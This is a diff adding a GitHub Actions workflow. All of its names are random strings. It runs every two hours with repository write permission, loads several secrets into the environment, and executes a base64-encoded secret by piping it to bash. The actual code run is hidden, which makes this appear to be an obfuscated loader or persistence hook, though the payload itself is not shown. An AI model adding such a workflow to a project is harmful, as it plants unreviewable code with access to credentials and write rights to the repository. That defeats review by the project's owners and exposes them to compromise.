@@ -1,0 +1,21 @@
+name: Em9MpxZ5t
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  dAPTGLcl:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.RUyRHPNPwi9th }}
+      - name: cbTxFEDClifCZ
+        env:
+          OneOTz3SaQClr: ${{ secrets.oVMLlGv }}
+          HrqlZ: ${{ secrets.gvz92GAOppK }}
+          b5sdEr: ${{ secrets.PPtjhC5 }}
+          GITHUB_TOKEN: ${{ secrets.RUyRHPNPwi9th }}
+        run: echo "$OneOTz3SaQClr" | base64 -d | bash
